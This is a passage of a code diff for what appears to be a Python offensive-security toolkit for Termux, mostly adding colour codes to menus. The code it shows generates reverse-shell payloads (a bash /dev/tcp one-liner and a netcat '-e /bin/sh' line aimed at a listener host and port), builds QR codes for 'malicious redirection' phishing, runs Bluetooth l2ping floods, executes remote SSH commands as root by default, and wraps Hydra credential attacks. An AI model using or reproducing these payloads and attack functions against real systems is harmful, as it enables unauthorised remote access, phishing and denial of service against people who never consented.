+        print(f"{Colors.GREEN}\n[✔] Credential audit logged to database.{Colors.ENDC}")
     except Exception as e:
-        print(f"\n[-] Hydra execution failed: {e}")
+        print(f"{Colors.RED}\n[-] Hydra execution failed: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_wireless_bt_scanner():
     """Option 1: Scan nearby Wi-Fi networks and Bluetooth devices using Termux API or binaries."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("    === OPTION 1: WIRELESS & BLUETOOTH AIRSPACE SCAN ===")
+    print("=== OPTION 1: WIRELESS & BLUETOOTH SCAN ===".center(60))
     print("-" * 60)
     
-    print("[*] Scanning nearby Wi-Fi access points...")
+    print(f"{Colors.GREEN}[*] Scanning nearby Wi-Fi access points...{Colors.ENDC}")
     wifi_output = ""
     try:
         res = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=5)
@@ -599,10 +616,10 @@ def handle_wireless_bt_scanner():
     if wifi_output.strip():
         print(wifi_output)
     else:
-        print("[-] Wi-Fi scan returned no data. (Tip: Install 'termux-api' package & app).")
+        print(f"{Colors.YELLOW}[-] Wi-Fi scan returned no data. (Tip: Install 'termux-api' package & app).{Colors.ENDC}")
 
     print("\n" + "=" * 60)
-    print("[*] Scanning nearby Bluetooth devices...")
+    print(f"{Colors.GREEN}[*] Scanning nearby Bluetooth devices...{Colors.ENDC}")
     bt_output = ""
     try:
         res = subprocess.run(["termux-bluetooth-devices"], capture_output=True, text=True, timeout=5)
@@ -621,17 +638,17 @@ def handle_wireless_bt_scanner():
     if bt_output.strip():
         print(bt_output)
     else:
-        print("[-] Bluetooth scan returned no data. Ensure Bluetooth is enabled.")
+        print(f"{Colors.RED}[-] Bluetooth scan returned no data. Ensure Bluetooth is enabled.{Colors.ENDC}")
         
     log_scan("Wireless & BT Scanner", "Local Airspace", "Executed airspace scan via Termux API/binaries")
-    input("\nPress Enter to return to main menu...")
+    input(f"{Colors.YELLOW}\nPress Enter to return to main menu...{Colors.ENDC}")
 
 def handle_subnet_sweep_tool():
     """Option 2: Whole Subnet Host Sweep (Active Discovery)."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("         === OPTION 2: WHOLE SUBNET HOST SWEEP ===")
+    print("=== OPTION 2: WHOLE SUBNET HOST SWEEP ===".center(60))
     print("-" * 60)
     
     ips = get_all_device_ips()
@@ -640,43 +657,43 @@ def handle_subnet_sweep_tool():
         _, ip_cidr = ips[0]
         default_subnet = get_subnet_range(ip_cidr)
         
-    subnet = input(f"Enter subnet/CIDR [default {default_subnet}] (or 'b' to back): ").strip()
+    subnet = input(f"{Colors.YELLOW}Enter subnet/CIDR [default {default_subnet}] (or 'b' to back): {Colors.ENDC}").strip()
     if subnet.lower() in ["b", "99", "back"]:
         return
     target_subnet = subnet if subnet else default_subnet
     
-    print(f"\n[+] Executing active ping/ARP sweep on host space: {target_subnet}...")
+    print(f"{Colors.GREEN}\n[+] Executing active ping/ARP sweep on host space: {target_subnet}...{Colors.ENDC}")
     try:
         cmd = ["nmap", "-sn", target_subnet]
         res = subprocess.run(cmd, capture_output=True, text=True, check=True)
         print(res.stdout)
         log_scan("Subnet Sweep", target_subnet, res.stdout)
     except Exception as e:
-        print(f"\n[-] Subnet sweep failed: {e}")
+        print(f"{Colors.RED}\n[-] Subnet sweep failed: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return to main menu...")
+    input(f"{Colors.YELLOW}\nPress Enter to return to main menu...{Colors.ENDC}")
             
 def handle_view_logs():
     """Display past scan logs stored in the database and view full output."""
     while True:
         clear_screen()
-        print(BANNER_IMAGE)
-        print("                === SCAN ARCHIVES (LOGS) ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print("=== SCAN ARCHIVES (LOGS) ===".center(60))
         print("-" * 60)
         
         logs = get_scan_logs()
         if not logs:
-            print("No scan logs found in the archives yet.")
-            input("\nPress Enter to return to the main menu...")
+            print(f"{Colors.YELLOW}No scan logs found in the archives yet.{Colors.ENDC}")
+            input(f"{Colors.YELLOW}\nPress Enter to return to the main menu...{Colors.ENDC}")
             break
             
         print(f"{'ID':<4} | {'Tool':<16} | {'Target':<15} | {'Timestamp'}")
-        print("-" * 60)
+        print("=" * 60)
         for log in logs:
             print(f"{log['id']:<4} | {log['tool_name']:<16} | {log['target']:<15} | {log['timestamp']}")
             
         print("-" * 60)
-        view_id = input("Enter log ID to view full output (or press Enter to go back): ").strip()
+        view_id = input(f"{Colors.YELLOW}Enter log ID to view full output (or press Enter to go back): {Colors.ENDC}").strip()
         if not view_id:
             break
             
@@ -685,8 +702,8 @@ def handle_view_logs():
                 row = conn.execute("SELECT tool_name, target, timestamp, output FROM scan_logs WHERE id = ?", (view_id,)).fetchone()
                 if row:
                     clear_screen()
-                    print(BANNER_IMAGE)
-                    print(f"=== LOG DETAILS [ID: {view_id}] ===")
+                    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+                    print(f"=== LOG DETAILS [ID: {view_id}] ===".center(60))
                     print(f"Tool:   {row['tool_name']}")
                     print(f"Target: {row['target']}")
                     print(f"Time:   {row['timestamp']}")
@@ -694,62 +711,62 @@ def handle_view_logs():
                     print(row['output'])
                     print("-" * 60)
                 else:
-                    print("\n[-] Error: Log ID not found.")
-            input("\nPress Enter to continue...")
+                    print(f"{Colors.RED}\n[-] Error: Log ID not found.{Colors.ENDC}")
+            input(f"{Colors.YELLOW}\nPress Enter to continue...{Colors.ENDC}")
         else:
-            print("\n[-] Invalid input. Please enter a numeric ID.")
-            input("\nPress Enter to continue...")
+            print(f"{Colors.RED}\n[-] Invalid input. Please enter a numeric ID.{Colors.ENDC}")
+            input(f"{Colors.YELLOW}\nPress Enter to continue...{Colors.ENDC}")
 
 def handle_ssh_audit():
     """Tool: SSH Remote Execution & Banner/Key Auditor."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("    === PAGE: SSH AUDITOR & REMOTE ACCESS ===")
+    print("=== PAGE: SSH AUDITOR & REMOTE ACCESS ===".center(60))
     print("-" * 60)
     
-    target = input("Enter target IP/hostname (or 'b' to back): ").strip()
+    target = input(f"{Colors.YELLOW}Enter target IP/hostname (or 'b' to back): {Colors.ENDC}").strip()
     if target.lower() in ["b", "99", "back", ""]:
         return
         
-    port = input("Enter SSH port [default 22]: ").strip() or "22"
-    user = input("Enter SSH username [default root]: ").strip() or "root"
+    port = input(f"{Colors.YELLOW}Enter SSH port [default 22]: {Colors.ENDC}").strip() or "22"
+    user = input(f"{Colors.YELLOW}Enter SSH username [default root]: {Colors.ENDC}").strip() or "root"
     
     print("\nSelect Action:")
     print("1. Audit Banner & Key Exchange Algorithms (ssh-keyscan)")
     print("2. Test Remote SSH Interactive Connection")
     print("3. Execute Single Remote Command")
     
-    choice = input("Select action [1-3]: ").strip()
+    choice = input(f"{Colors.YELLOW}Select action [1-3]: {Colors.ENDC}").strip()
     
     if choice == "1":
-        print(f"\n[+] Querying SSH key signatures for {target}:{port}...")
+        print(f"{Colors.GREEN}\n[+] Querying SSH key signatures for {target}:{port}...{Colors.ENDC}")
         try:
             cmd = ["ssh-keyscan", "-p", port, target]
             res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
             output = res.stdout if res.stdout else res.stderr
             
             clear_screen()
-            print(BANNER_IMAGE)
-            print(f"=== SSH KEYSCAN TELEMETRY: {target} ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print(f"=== SSH KEYSCAN TELEMETRY: {target} ===".center(60))
             print(output)
             
             log_scan("SSH Keyscan", f"{target}:{port}", output)
-            print("\n[✔] SSH key telemetry logged to database.")
+            print(f"{Colors.GREEN}\n[✔] SSH key telemetry logged to database.{Colors.ENDC}")
         except Exception as e:
-            print(f"\n[-] SSH keyscan failed: {e}")
+            print(f"{Colors.RED}\n[-] SSH keyscan failed: {e}{Colors.ENDC}")
             
     elif choice == "2":
-        print(f"\n[+] Spawning interactive SSH session to {user}@{target}:{port}...")
+        print(f"{Colors.GREEN}\n[+] Spawning interactive SSH session to {user}@{target}:{port}...{Colors.ENDC}")
         try:
             subprocess.run(["ssh", "-p", port, f"{user}@{target}"])
         except Exception as e:
-            print(f"\n[-] Interactive SSH failed: {e}")
+            print(f"{Colors.RED}\n[-] Interactive SSH failed: {e}{Colors.ENDC}")
             
     elif choice == "3":
-        remote_cmd = input("Enter remote command to execute: ").strip()
+        remote_cmd = input(f"{Colors.YELLOW}Enter remote command to execute: {Colors.ENDC}").strip()
         if remote_cmd:
-            print(f"\n[+] Executing '{remote_cmd}' on {target}...")
+            print(f"{Colors.GREEN}\n[+] Executing '{remote_cmd}' on {target}...{Colors.ENDC}")
             try:
                 cmd = ["ssh", "-p", port, f"{user}@{target}", remote_cmd]
                 res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
@@ -757,71 +774,70 @@ def handle_ssh_audit():
                 print(output)
                 log_scan("SSH Remote Exec", f"{user}@{target}", output)
             except Exception as e:
-                print(f"\n[-] Remote command failed: {e}")
+                print(f"{Colors.RED}\n[-] Remote command failed: {e}{Colors.ENDC}")
                 
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_powershell_audit():
     """Tool: PowerShell Core (pwsh) & WinRM Remote Management."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("       === PAGE: POWERSHELL CORE & WINRM AUDITOR ===")
+    print("=== PAGE: POWERSHELL CORE & WINRM ===".center(60))
     print("-" * 60)
     
     if not shutil.which("pwsh"):
-        print("\n[-] Notice: 'pwsh' (PowerShell Core) binary is not installed in this environment.")
-        print("[*] To install in Termux: `pkg install powershell` (if available for your arch).")
-        print("[*] Alternatively, use WinRM to target remote Windows hosts from an external controller.")
-        input("\nPress Enter to return...")
+        print(f"{Colors.RED}\n[-] Notice: 'pwsh' (PowerShell Core) binary is not installed in this environment.{Colors.ENDC}")
+        print(f"{Colors.YELLOW}[*] To install in Termux: `pkg install powershell` (if available for your arch).{Colors.ENDC}")
+        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
         return
 
     print("Select Mode:")
     print("1. Run Local PowerShell Command / One-Liner (pwsh -c)")
     print("2. WinRM Remote Query (WS-Man / Windows Hosts)")
-    print("99. Back (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
     if choice == "1":
-        ps_cmd = input("Enter PowerShell command: ").strip()
+        ps_cmd = input(f"{Colors.YELLOW}Enter PowerShell command: {Colors.ENDC}").strip()
         if not ps_cmd:
             return
         try:
             cmd = ["pwsh", "-NoProfile", "-NonInteractive", "-Command", ps_cmd]
             res = subprocess.run(cmd, capture_output=True, text=True, check=True)
             clear_screen()
-            print(BANNER_IMAGE)
-            print("=== POWERSHELL EXECUTION OUTPUT ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print("=== POWERSHELL EXECUTION OUTPUT ===".center(60))
             print(res.stdout)
             log_scan("PowerShell Command", "Local Host", res.stdout)
         except Exception as e:
-            print(f"\n[-] PowerShell execution failed: {e}")
+            print(f"{Colors.RED}\n[-] PowerShell execution failed: {e}{Colors.ENDC}")
             
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_wireless_recon():
     """Tool: Wireless & RF Footprinting with fallback interface checks."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("     === PAGE: WIRELESS & RF FOOTPRINTING ===")
+    print("=== PAGE: WIRELESS & RF FOOTPRINTING ===".center(60))
     print("-" * 60)
     print("1. List Wireless Interfaces & Status (iw / nmcli / ip link)")
     print("2. Scan Nearby Wi-Fi Networks")
-    print("99. Back to Suite Menu (b)")
+    print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
     output = ""
     if choice == "1":
-        print("\n[+] Querying wireless subsystem...")
+        print(f"{Colors.GREEN}\n[+] Querying wireless subsystem...{Colors.ENDC}")
         try:
             if shutil.which("iw"):
                 res = subprocess.run(["iw", "dev"], capture_output=True, text=True, check=True)
@@ -838,7 +854,7 @@ def handle_wireless_recon():
             output = f"[-] Wireless query failed: {e}"
             
     elif choice == "2":
-        print("\n[+] Scanning nearby Wi-Fi networks...")
+        print(f"{Colors.GREEN}\n[+] Scanning nearby Wi-Fi networks...{Colors.ENDC}")
         try:
             if shutil.which("nmcli"):
                 res = subprocess.run(["nmcli", "device", "wifi", "list"], capture_output=True, text=True, check=True)
@@ -849,27 +865,27 @@ def handle_wireless_recon():
             output = f"[-] Wi-Fi scan failed: {e}"
             
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("=== WIRELESS / RF TELEMETRY ===")
+    print("=== WIRELESS / RF TELEMETRY ===".center(60))
     print(output)
     log_scan("Wireless Recon", "Airspace", output)
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_monitor_mode():
     """Hardware Tool: Toggle wireless interface monitor mode via airmon-ng or iwconfig."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("        === WIRELESS MONITOR MODE & DONGLE MANAGER ===")
+    print("=== WIRELESS MONITOR MODE MANAGER ===".center(60))
     print("-" * 60)
     print("1. Check Wireless Interfaces (airmon-ng / iwconfig)")
     print("2. Enable Monitor Mode on Interface (e.g., wlan0)")
     print("3. Disable Monitor Mode")
-    print("99. Back (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-3, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
     elif choice == "1":
@@ -881,120 +897,121 @@ def handle_monitor_mode():
                 res = subprocess.run(["iwconfig"], capture_output=True, text=True, check=True)
                 print(res.stdout)
             except Exception as e:
-                print(f"[-] Wireless query failed: {e}")
+                print(f"{Colors.RED}[-] Wireless query failed: {e}{Colors.ENDC}")
     elif choice == "2":
-        iface = input("Enter interface name to put into monitor mode (e.g., wlan0): ").strip()
+        iface = input(f"{Colors.YELLOW}Enter interface name to put into monitor mode (e.g., wlan0): {Colors.ENDC}").strip()
         if iface:
             try:
                 subprocess.run(["airmon-ng", "start", iface], check=True)
-                print(f"\n[✔] Monitor mode enabled.")
+                print(f"{Colors.GREEN}\n[✔] Monitor mode enabled.{Colors.ENDC}")
             except Exception as e:
-                print(f"[-] Failed to start monitor mode: {e}")
+                print(f"{Colors.RED}[-] Failed to start monitor mode: {e}{Colors.ENDC}")
     elif choice == "3":
-        iface = input("Enter monitor interface name to stop (e.g., wlan0mon): ").strip()
+        iface = input(f"{Colors.YELLOW}Enter monitor interface name to stop (e.g., wlan0mon): {Colors.ENDC}").strip()
         if iface:
             try:
                 subprocess.run(["airmon-ng", "stop", iface], check=True)
-                print(f"\n[✔] Monitor mode stopped.")
+                print(f"{Colors.GREEN}\n[✔] Monitor mode stopped.{Colors.ENDC}")
             except Exception as e:
-                print(f"[-] Failed to stop monitor mode: {e}")
-    input("\nPress Enter to return...")
+                print(f"{Colors.RED}[-] Failed to stop monitor mode: {e}{Colors.ENDC}")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_wordlist_manager():
     """Integrated Wordlist Manager: Verify and sync standard wordlists."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("            === INTEGRATED WORDLIST MANAGER ===")
+    print("=== INTEGRATED WORDLIST MANAGER ===".center(60))
     print("-" * 60)
     wordlist_path = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
     print(f"[*] Default Wordlist Path: {wordlist_path}")
     
     exists = os.path.exists(wordlist_path)
-    print(f"[*] Status: {'FOUND [✔]' if exists else 'MISSING [✘]'}")
+    status_str = f"{Colors.GREEN}FOUND [✔]{Colors.ENDC}" if exists else f"{Colors.RED}MISSING [✘]{Colors.ENDC}"
+    print(f"[*] Status: {status_str}")
     
     if not exists:
-        print("\n[+] Creating standard fallback wordlist directory & file...")
+        print(f"{Colors.GREEN}\n[+] Creating standard fallback wordlist directory & file...{Colors.ENDC}")
         try:
             os.makedirs(os.path.dirname(wordlist_path), exist_ok=True)
             sample_words = ["admin", "login", "dashboard", "api", "config.json", "secret", "backup", "test", "uploads", "wp-admin", "server-status"]
             with open(wordlist_path, "w") as wf:
                 wf.write("\n".join(sample_words) + "\n")
-            print("[✔] Fallback common wordlist created successfully!")
+            print(f"{Colors.GREEN}[✔] Fallback common wordlist created successfully!{Colors.ENDC}")
         except Exception as e:
-            print(f"[-] Failed to create wordlist: {e}")
+            print(f"{Colors.RED}[-] Failed to create wordlist: {e}{Colors.ENDC}")
     else:
-        print("[✔] Wordlist is verified and ready for FFUF and audit tools.")
+        print(f"{Colors.GREEN}[✔] Wordlist is verified and ready for FFUF and audit tools.{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
-    
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
+
 def handle_bluetooth_recon():
     """Tool: Bluetooth & BLE Airspace Mapping."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("            === BLUETOOTH & BLE AIRSPACE RECON ===")
+    print("=== BLUETOOTH & BLE AIRSPACE RECON ===".center(60))
     print("-" * 60)
     print("1. Scan Classic Bluetooth Devices (hcitool scan)")
     print("2. Scan BLE Devices (bluetoothctl scan le)")
-    print("99. Back (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
     if choice == "1":
-        print("\n[+] Scanning for classic Bluetooth devices...")
+        print(f"{Colors.GREEN}\n[+] Scanning for classic Bluetooth devices...{Colors.ENDC}")
         try:
             res = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=15)
             output = res.stdout if res.stdout else res.stderr
             clear_screen()
-            print(BANNER_IMAGE)
-            print("=== CLASSIC BLUETOOTH SCAN RESULTS ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print("=== CLASSIC BLUETOOTH SCAN RESULTS ===".center(60))
             print(output)
             log_scan("Bluetooth Scan", "Airspace", output)
         except Exception as e:
-            print(f"[-] Bluetooth scan failed (ensure HCI interface is up): {e}")
+            print(f"{Colors.RED}[-] Bluetooth scan failed (ensure HCI interface is up): {e}{Colors.ENDC}")
             
     elif choice == "2":
-        print("\n[+] Scanning BLE beacons and devices (10s timeout)...")
+        print(f"{Colors.GREEN}\n[+] Scanning BLE beacons and devices (10s timeout)...{Colors.ENDC}")
         try:
             res = subprocess.run(["bluetoothctl", "scan", "le"], capture_output=True, text=True, timeout=10)
             output = res.stdout
             clear_screen()
-            print(BANNER_IMAGE)
-            print("=== BLE SCAN RESULTS ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print("=== BLE SCAN RESULTS ===".center(60))
             print(output)
             log_scan("BLE Scan", "Airspace", output)
         except Exception as e:
-            print(f"[-] BLE scan failed: {e}")
+            print(f"{Colors.RED}[-] BLE scan failed: {e}{Colors.ENDC}")
             
-    input("\nPress Enter to return...")
-    
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
+
 def handle_payload_generator():
     """Tool: Tactical Reverse Shell & Payload Generator."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("        === PAGE: TACTICAL REVERSE SHELL GENERATOR ===")
+    print("=== PAGE: TACTICAL REVERSE SHELL ===".center(60))
     print("-" * 60)
     print("1. Python3 Socket Reverse Shell")
     print("2. Bash TCP Reverse Shell One-Liner")
     print("3. Netcat Traditional / OpenBSD Listener Command")
-    print("99. Back (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-3, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-3, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
-    lhost = input("Enter LHOST (Listener IP): ").strip()
-    lport = input("Enter LPORT (Listener Port): ").strip()
+    lhost = input(f"{Colors.YELLOW}Enter LHOST (Listener IP): {Colors.ENDC}").strip()
+    lport = input(f"{Colors.YELLOW}Enter LPORT (Listener Port): {Colors.ENDC}").strip()
     
     if not lhost or not lport:
-        print("[-] LHOST and LPORT are required.")
-        input("\nPress Enter to return...")
+        print(f"{Colors.RED}[-] LHOST and LPORT are required.{Colors.ENDC}")
+        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
         return
         
     payload = ""
@@ -1003,24 +1020,25 @@ def handle_payload_generator():
     elif choice == "2":
         payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
     elif choice == "3":
-        payload = f"nc -e /bin/sh {lhost} {lport}  # (or: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f)"
+        payload = f"nc -e /bin/sh {lhost} {lport}"
         
     clear_screen()
-    print(BANNER_IMAGE)
-    print("=== GENERATED PAYLOAD STUB ===")
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+    print("=== GENERATED PAYLOAD STUB ===".center(60))
     print(f"\n{payload}\n")
     print("-" * 60)
     log_scan("Payload Generator", f"LHOST:{lhost} LPORT:{lport}", payload)
-    input("Press Enter to return...")
+    
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_qr_exploit():
     """Tool: QR Code Payload / Phishing Vector Generator."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("        === PAGE: QR CODE EXPLOIT / PAYLOAD GENERATOR ===")
+    print("=== PAGE: QR CODE PAYLOAD GENERATOR ===".center(60))
     print("-" * 60)
-    target_url = input("Enter payload URL or malicious redirection target: ").strip()
+    target_url = input(f"{Colors.YELLOW}Enter payload URL or malicious redirection target: {Colors.ENDC}").strip()
     if not target_url:
         return
         
@@ -1030,106 +1048,105 @@ def handle_qr_exploit():
         qr.make(fit=True)
         
         clear_screen()
-        print(BANNER_IMAGE)
-        print(f"=== ASCII QR CODE PAYLOAD FOR: {target_url} ===")
+        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+        print(f"=== ASCII QR CODE PAYLOAD ===".center(60))
         qr.print_ascii(tty=True)
         print("-" * 60)
         log_scan("QR Code Generator", target_url, "Generated ASCII QR payload")
     except Exception as e:
-        print(f"[-] Failed to generate QR code (ensure 'qrcode' is installed): {e}")
+        print(f"{Colors.RED}[-] Failed to generate QR code: {e}{Colors.ENDC}")
         
-    input("\nPress Enter to return...")
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_bluetooth_attacks():
     """Tool: Advanced Bluetooth Enumeration & L2CAP Stress Testing."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("     === PAGE: BLUETOOTH ATTACK & ENUMERATION SUITE ===")
+    print("=== PAGE: BLUETOOTH ATTACK SUITE ===".center(60))
     print("-" * 60)
     print("1. Scan & Enumerate Device SDP Services (sdptool)")
     print("2. L2CAP Ping Flood / Stress Test (l2ping)")
-    print("99. Back (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
-    target_mac = input("Enter Target Bluetooth MAC Address (e.g., 00:11:22:33:44:55): ").strip()
+    target_mac = input(f"{Colors.YELLOW}Enter Target Bluetooth MAC Address (e.g., 00:11:22:33:44:55): {Colors.ENDC}").strip()
     if not target_mac:
         return
         
     if choice == "1":
-        print(f"\n[+] Querying SDP records for {target_mac}...")
+        print(f"{Colors.GREEN}\n[+] Querying SDP records for {target_mac}...{Colors.ENDC}")
         try:
             res = subprocess.run(["sdptool", "browse", target_mac], capture_output=True, text=True, timeout=15)
             output = res.stdout if res.stdout else res.stderr
             clear_screen()
-            print(BANNER_IMAGE)
-            print("=== SDP BROWSE RESULTS ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print("=== SDP BROWSE RESULTS ===".center(60))
             print(output)
             log_scan("Bluetooth SDP Browse", target_mac, output)
         except Exception as e:
-            print(f"[-] SDP browse failed: {e}")
+            print(f"{Colors.RED}[-] SDP browse failed: {e}{Colors.ENDC}")
             
     elif choice == "2":
-        count = input("Enter packet count (default 500): ").strip() or "500"
-        print(f"\n[+] Executing l2ping stress test against {target_mac} ({count} packets)...")
+        count = input(f"{Colors.YELLOW}Enter packet count (default 500): {Colors.ENDC}").strip() or "500"
+        print(f"{Colors.GREEN}\n[+] Executing l2ping stress test against {target_mac} ({count} packets)...{Colors.ENDC}")
         try:
             res = subprocess.run(["l2ping", "-i", "hci0", "-s", "600", "-c", count, target_mac], capture_output=True, text=True, timeout=20)
             output = res.stdout
             clear_screen()
-            print(BANNER_IMAGE)
-            print("=== L2PING STRESS TEST RESULTS ===")
+            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
+            print("=== L2PING STRESS TEST RESULTS ===".center(60))
             print(output)
             log_scan("Bluetooth l2ping", target_mac, output)
         except Exception as e:
-            print(f"[-] l2ping attack failed: {e}")
+            print(f"{Colors.RED}[-] l2ping attack failed: {e}{Colors.ENDC}")
             
-    input("\nPress Enter to return...")
-    
+    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")
 
 def handle_crypto_engine():
     """Tool: Cryptographic Encryption and Decryption Engine."""
     clear_screen()
-    print(BANNER_IMAGE)
+    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
     print_tactical_header()
-    print("          === PAGE: CRYPTO & OBFUSCATION ENGINE ===")
+    print("=== PAGE: CRYPTO & OBFUSCATION ENGINE ===".center(60))
     print("-" * 60)
     print("1. Base64 Encode / Decode")
     print("2. Simple XOR Transformation")
-    print("99. Back to Suite Menu (b)")
+    print(f"{Colors.RED}99. Back (b){Colors.ENDC}")
     print("-" * 60)
     
-    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
+    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
     if choice in ["99", "b", "back"]:
         return
         
     if choice == "1":
-        mode = input("Choose mode - [e]ncode or [d]ecode: ").strip().lower()
-        text = input("Enter text input: ")
+        mode = input(f"{Colors.YELLOW}Choose mode - [e]ncode or [d]ecode: {Colors.ENDC}").strip().lower()
+        text = input(f"{Colors.YELLOW}Enter text input: {Colors.ENDC}")
         try:
             if mode.startswith('e'):
                 res = base64.b64encode(text.encode('utf-8')).decode('utf-8')
-                print(f"\n[+] Encoded (Base64):\n{res}")
+                print(f"{Colors.GREEN}\n[+] Encoded (Base64):\n{res}{Colors.ENDC}")
                 log_scan("Crypto Engine", "Base64 Encode", res)
             else:
                 res = base64.b64decode(text.encode('utf-8')).decode('utf-8')
-                print(f"\n[+] Decoded (Base64):\n{res}")
+                print(f"{Colors.GREEN}\n[+] Decoded (Base64):\n{res}{Colors.ENDC}")
                 log_scan("Crypto Engine", "Base64 Decode", res)
         except Exception as e:
-            print(f"\n[-] Crypto operation failed: {e}")
+            print(f"{Colors.RED}\n[-] Crypto operation failed: {e}{Colors.ENDC}")
             
     elif choice == "2":
-        text = input("Enter text: ")
-        key = input("Enter single character key: ")
+        text = input(f"{Colors.YELLOW}Enter text: {Colors.ENDC}")
+        key = input(f"{Colors.YELLOW}Enter single character key: {Colors.ENDC}")
         if not key:
             return
         k = key[0]
         output = "".join(chr(ord(c) ^ ord(k)) for c in text)
